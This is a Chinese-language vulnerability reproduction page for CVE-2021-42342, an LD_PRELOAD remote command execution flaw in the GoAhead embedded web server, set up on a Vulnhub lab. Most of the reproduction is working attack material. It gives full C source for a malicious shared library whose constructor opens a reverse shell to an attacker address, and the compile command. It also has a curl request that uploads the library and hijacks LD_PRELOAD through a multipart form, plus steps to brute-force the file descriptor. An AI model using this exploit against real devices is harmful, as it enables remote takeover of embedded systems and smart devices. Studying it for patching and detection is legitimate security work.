# Goahead LD_PRELOAD 远程命令执行漏洞 CVE-2021-42342

## 漏洞描述

GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序。

这个漏洞是 CVE-2017-17562 漏洞补丁的绕过，攻击者可以利用该补丁没有考虑到的multipart表单控制目标服务器的环境变量，进而劫持LD_PRELOAD来执行任意代码。

## 漏洞影响

<a-checkbox checked>5.x <= GoAhead web-server < 5.1.5</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="GoAhead"</a-checkbox></br>

## 漏洞复现

使用Vulnhub下的靶场进行搭建

![img](../../../.vuepress/public/img/1657072904829-9775cbdc-249f-42d1-8d8b-f7f016600500.png)

编译恶意 so 文件

```php
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/in.h>

char *server_ip="";
uint32_t server_port=7777;

static void reverse_shell(void) __attribute__((constructor));
static void reverse_shell(void) 
{
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in attacker_addr = {0};
  attacker_addr.sin_family = AF_INET;
  attacker_addr.sin_port = htons(server_port);
  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
  if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
    exit(0);
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);
  execve("/bin/bash", 0, 0);
}
gcc evil.c -fPIC -s -shared -o evil.so
```

发送 evil.so 恶意文件

```php
curl -v -F data=@evil.so -F "LD_PRELOAD=/proc/self/fd/0" http://xxx.xxx.xxx.xxx:8080/cgi-bin/hello
```

发送请求后抓包将`Content-Length`设置成小于最终的数据包Body大小，并爆破 `/proc/self/fd/1 反弹 shell `

![img](../../../.vuepress/public/img/1657075996296-e5f8e37e-33db-424b-a040-5e890fad829a.png)